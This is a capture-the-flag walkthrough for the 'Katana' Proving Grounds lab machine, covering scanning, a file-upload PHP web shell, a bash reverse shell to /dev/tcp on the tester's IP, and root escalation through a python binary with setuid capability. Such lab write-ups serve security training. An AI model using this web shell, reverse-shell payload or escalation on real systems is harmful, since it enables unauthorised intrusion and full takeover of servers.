---
layout: default
title: Katana
parent: Proving Grounds - Linux
nav_order: 2
---

# Katana

---

## Host Info

- **OS**: Linux
- **Hostname**: katana
- **IP**: 192.168.183.83

## Discovered Ports for Enumeration

- 21 - FTP
- 22 - SSH
- 80 - HTTP
- 7080 - empoweri
- 8088 - HTTP
- 8715 - HTTP

## Users and Credentials

- **Users**:
- **Credentials**:

# Scanning (Nmap)

---

```bash
sudo nmap -Pn -p- -sC -sV -T4 -vv --open 192.168.183.83
```

# Enumeration

---

## 21 - FTP

Anonymous logon not allowed.

## 80 - HTTP

Authenticate to /ebook/admin.php with **_admin:admin_** but ends up being deadend.

## 8088 - HTTP

Running **wfuzz** returns the following files:

- index.html
- upload.php
- upload.html

**upload.html** provides a place to upload files.

![upload](../../../assets/images/ctfs/proving_grounds/katana/upload.png)

### Upload PHP cmd shell

Create **shell.php** with the following contents:

```bash
<?php
echo "<pre>";
passthru($_GET['cmd']);
echo "</pre>";
?>
```

After successful upload the output indicates that the PHP web shell has been placed on the "other web server"

![upload_message](../../../assets/images/ctfs/proving_grounds/katana/upload_message.png)

# Exploitation

---

## Reverse Shell via PHP Web Shell

We have a PHP web shell with command execution.

Generate a reverse shell using **revshellgen**

```bash
# Generate reverse shell payload
revshellgen -i 192.168.45.217 -p 9001 -t bash

# URL encode the payload
urlencode "bash -i >& /dev/tcp/192.168.45.217/9001 0>&1"

# Output
bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.217%2F9001%200%3E%261
```

Execute the URL encoded payload in the PHP web shell

```bash
# URL to execute
http://192.168.183.83:8715/katana_shell.php?cmd=bash -c "bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.217%2F9001%200%3E%261"
```

Receive back a reverse shell on the netcat listener.

![rev_shell](../../../assets/images/ctfs/proving_grounds/katana/rev_shell.png)

# Post-Exploitation

---

Elevate shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
stty size
stty raw -echo
fg
stty rows <first_value>
stty cols <second_value>
export TERM=xterm-256color
```

## Check for extended capabilities

```bash
getcap -r / 2>/dev/null
```

![extend_cap](../../../assets/images/ctfs/proving_grounds/katana/extend_cap.png)

Within the /tmp directory, create **priv.py** that does the following:

1. Sets the UID to 0
2. Generates a /bin/bash shell

```python
import os

os.setuid(0)
os.system("/bin/bash")
```

Make **priv.py** executable and run with python2.7 to get root shell.

![root](../../../assets/images/ctfs/proving_grounds/katana/root.png)
